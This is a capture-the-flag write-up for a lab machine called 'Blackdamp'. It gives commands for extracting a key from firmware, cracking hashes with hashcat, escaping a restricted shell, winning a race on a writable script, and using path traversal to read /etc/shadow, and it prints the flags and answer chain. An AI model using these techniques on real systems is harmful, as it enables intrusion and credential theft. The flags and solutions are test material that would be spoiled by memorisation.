# 28-blackdamp

**Category:** Boot2Root | **Difficulty:** Medium–Hard (box 2 of the 4-box chain) | **Flags:** user `Null0rigin{the_seam_number_was_two_of_the_four}` / root `Null0rigin{you_paid_for_every_candidate}`

## Challenge Description

> Somebody left the status page up.

Blackdamp is the second machine in the chain — an old mining plant held together with shell scripts, old firmware, and very optimistic password rules. The one-line description is a genuine hint: the exposed status page is the thread you pull. Opening its **root** seal additionally requires `00-smoke`'s root flag.

## Recon & Initial Analysis

```bash
export IP=<TARGET_IP>
nmap -Pn -sC -sV -p- "$IP"
```

Useful services:

```text
22/tcp    SSH
80/tcp    Blackdamp pit monitor / status page
7731/tcp  Assay plant (binary protocol)
7777/tcp  Assay log service (loopback only)
8088/tcp  Lamp firmware OTA server
9001/tcp  Crusher telemetry gateway
```

Port 80 explains that `/status` and `/pit-records.tar` need an hourly HMAC, and that the HMAC key lives *inside the lamp firmware* — which the OTA server on 8088 hands to anyone:

```bash
curl "http://$IP/"
curl -o lamp-fw.img "http://$IP:8088/firmware.bin"
```

That's the headline lesson: **a secret isn't secret just because it lives in firmware.**

**Decoy warning:** port 9001 leads into a little container-like environment whose "root" flag (`Null0rigin{that_root_was_not_the_root}`) is fake. Several convincing bait flags exist here; real ones come only from the sealed files.

## Foothold / Core Concept

### 1. Repair the firmware (`repair_firmware.py`)

The OTA page documents a `BDFW` container header and — unusually honestly — admits the SquashFS payload has 12 bytes zeroed: restore `hsqs` at payload+0x00 and the LE u64 length at payload+0x28. The stored MD5 confirms the fix (a checksum used as a *repair instruction*, not just a warning):

```bash
python3 repair_firmware.py lamp-fw.img      # -> lamp-repaired.sqfs
unsquashfs -d lamp-root lamp-repaired.sqfs
```

Inside: `etc/assay/SHIFT-KEY.txt` (the plant key), `CREDENTIAL-STANDARD.txt`, `PERSONNEL-EXTRACT.txt`, `OFFICE-MAIL.txt`, `plant.shadow` (hashes), and `usr/include/assay-proto.h` (the port-7731 protocol). The plant key is used as **64 ASCII characters**, not 32 decoded hex bytes.

### 2. The password policy

Base token = any ≥5-letter lowercase run from the pit records. Class transform:

```text
staff       Capitalize first char.
contractor  Capitalize, then a/e/i/o/s -> 4/3/1/0/5.
bundle      Keep lowercase, prefix "<district>-".
```

Then append `2-digit seam + 3-digit shot + marker(!@#$%&)`. Personnel rows give holders/seams/classes; `OFFICE-MAIL.txt` even leaks a worked example `Elmmere91163#`, confirming the holder's name is the base token. `plant.shadow` lets you check guesses offline.

### 3. Authenticate + pull the records (`assay_client.py`)

The status page wants `X-Shift-Code = HMAC-SHA256(plantkey_ascii, unix_hour)[:16]` as hex. `/status` returns a changing `gas:` figure; the assay protocol on 7731 wants the plain **CRC-32 of that exact decimal string** as its HELLO token (no units/space/newline, and it's time-sensitive). The script does the whole dance — fetch status, compute both tokens, HELLO/LIST/FETCH — and downloads `lamp-assay.7z`. Also grab the records and build the vocabulary:

```bash
SHIFT_CODE=$(python3 -c 'import...')   # see assay_client.py
curl -H "X-Shift-Code: $SHIFT_CODE" -o pit-records.tar "http://$IP/pit-records.tar"
mkdir pit-records && tar xf pit-records.tar -C pit-records
grep -rhoE '[a-z]{5,}' pit-records | sort -u > vocab.txt
```

### 4. Crack the bundle + SSH key, get fragment A

`bundle` = district `bd`, seam `54`, holder `bridgebottom` → base `bd-bridgebottom54`:

```bash
printf '%s\n' 'bd-bridgebottom54' > bundle-base.txt
hashcat -m 1800 -a 6 bundle.hash bundle-base.txt '?d?d?d?1' -1 '!@#$%&'   # -> bd-bridgebottom54322@
7z x -p'bd-bridgebottom54322@' lamp-assay.7z
```

Yields `seal-frag-A.txt` = `ea3f9e5b` and an encrypted `id_ed25519`. The key passphrase is the contractor `wwwkey` password (`heathlow -> H34thl0w`, seam `00`):

```bash
printf '%s\n' 'H34thl0w00' > www-base.txt
hashcat -m 1800 -a 6 www.hash www-base.txt '?d?d?d?1' -1 '!@#$%&'   # -> H34thl0w00698$
```

### 5. SSH as `www` and escape the restricted shell

```bash
ssh -i www_id_ed25519 www@"$IP"
```

Lands in `pitsh` (allowed: `ls cat head tail wc grep id date uptime pitlog pitview`). `pitview` is a pager whose `h` help exposes `!CMD` / `!` — a built-in shell escape:

```text
pit$ pitview /etc/passwd
--more--  (press h)
! /bin/sh
```

Then fix PATH: `export PATH=/bin:/usr/bin:/sbin:/usr/sbin`. A restricted shell is only as restricted as its most powerful allowed program.

## Privilege Escalation

### 6. www → assay (4-second rotate.sh race)

`/var/lib/assay/rotate.sh` is made world-writable for four seconds every minute by a root supervisor, then executed as `assay`. Win the window to install your key:

```bash
ssh-keygen -t ed25519 -N '' -f assay_id     # on attacker; paste assay_id.pub to /tmp/assay.pub on target
cat > /tmp/rotate-payload.sh <<'EOF'
#!/bin/sh
cat /tmp/assay.pub > /home/assay/.ssh/authorized_keys
chmod 600 /home/assay/.ssh/authorized_keys
EOF
chmod +x /tmp/rotate-payload.sh
while ! cp /tmp/rotate-payload.sh /var/lib/assay/rotate.sh 2>/dev/null; do sleep 0.2; done
ssh -i assay_id assay@"$IP"      # a few seconds later
```

### 7. User flag (fragment B)

```bash
cat /home/assay/.assay/seal-frag-B.txt            # bda5c910
/usr/local/bin/unseal --user bda5c910             # -> Null0rigin{the_seam_number_was_two_of_the_four}
```

### 8. Recover the site-key password

`assay` can read `/var/lib/assay/readings.db`; one BLOB row is a `$6$` hash for `sitekdb` (staff, holder `drinksopp`, seam `70`):

```bash
sqlite3 /var/lib/assay/readings.db "select id, cast(blob as text) from readings where blob is not null;"
printf '%s\n' 'Drinksopp70' > sitekdb-base.txt
hashcat -m 1800 -a 6 sitekdb.hash sitekdb-base.txt '?d?d?d?1' -1 '!@#$%&'   # -> Drinksopp70477%
```

### 9. Fragment C via the loopback log service (7777)

Port 7777 is loopback-only, so reach it from the target shell. `FETCH` joins your name onto `/var/lib/assay/logs/` without rejecting `../`, and the daemon is privileged → arbitrary file read:

```bash
nc 127.0.0.1 7777
AUTH Drinksopp70477%
FETCH ../../../../root/.seal-frag-C        # -> f4c01df2
FETCH ../../../../etc/shadow               # grab root's hash too
```

Root = staff, holder `drinkmere`, seam `11`:

```bash
printf '%s\n' 'Drinkmere11' > root-base.txt
hashcat -m 1800 -a 6 root.hash root-base.txt '?d?d?d?1' -1 '!@#$%&'   # -> Drinkmere11257#
```

## Exploitation Walkthrough

The three fragments concatenate to the seed `ea3f9e5bbda5c910f4c01df2`. The seal wants a live SHA-256 / 30-second RFC-6238 TOTP (seed as ASCII) — `totp.py`. Then run the privileged tool as `assay`, supplying the previous box's root flag as the chain key:

```bash
doas /usr/local/bin/unseal
# shift password: Drinkmere11257#
# seal seed:      ea3f9e5bbda5c910f4c01df2
# seal code:      <fresh totp.py output>
# chain key:      Null0rigin{two_figures_off_a_payroll_sheet}   (00-smoke root flag)
# -> Null0rigin{you_paid_for_every_candidate}
```

`unseal` also checks the running kernel/monitor against a boot-time record, so an offline disk-mount copy of `root.txt.sealed` won't open. Full scripts: `repair_firmware.py`, `assay_client.py`, `totp.py`.

## Flags

user: `Null0rigin{the_seam_number_was_two_of_the_four}`
root: `Null0rigin{you_paid_for_every_candidate}`

(Keep the root flag — it's the chain key for `29-stillwater`.)

## Key Takeaways

- Firmware is attack surface and routinely holds production secrets.
- Checksums can double as repair instructions, not just integrity checks.
- A company-wide password formula turns leaked personnel data into a tiny targeted mask.
- Restricted shells fall to their most powerful allowed program (here a pager's `!` escape).
- Briefly making a privileged script writable is still making it writable.
- Joining an untrusted filename onto a trusted directory is not traversal protection.
- Time-based codes are nearly worthless once the long-term seed leaks.
- In this chain, *getting root* and *opening the root seal* are deliberately separate jobs.
